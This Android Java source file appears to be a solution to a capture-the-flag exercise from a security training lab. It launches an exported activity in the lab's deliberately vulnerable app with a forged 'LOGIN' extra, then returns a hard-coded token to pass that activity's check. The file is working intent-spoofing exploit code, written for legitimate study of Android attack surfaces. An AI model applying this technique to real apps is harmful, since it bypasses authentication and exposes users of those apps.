package com.android.zerohextree;

import static android.content.ContentValues.TAG;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag12Binding;

public class flag12 extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        launchAttack();
        // Create a result intent with the token
        Intent resultIntent = new Intent();
        resultIntent.putExtra("token", 1094795585);

        // Send the result back to Flag12Activity
        setResult(RESULT_OK, resultIntent);
        finish();
    }
    private void launchAttack() {
        // Start Flag12Activity with LOGIN=true
        Intent triggerIntent = new Intent();
        triggerIntent.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag12Activity"
        );
        triggerIntent.putExtra("LOGIN", true); // Critical for the check
        startActivity(triggerIntent);
    }

}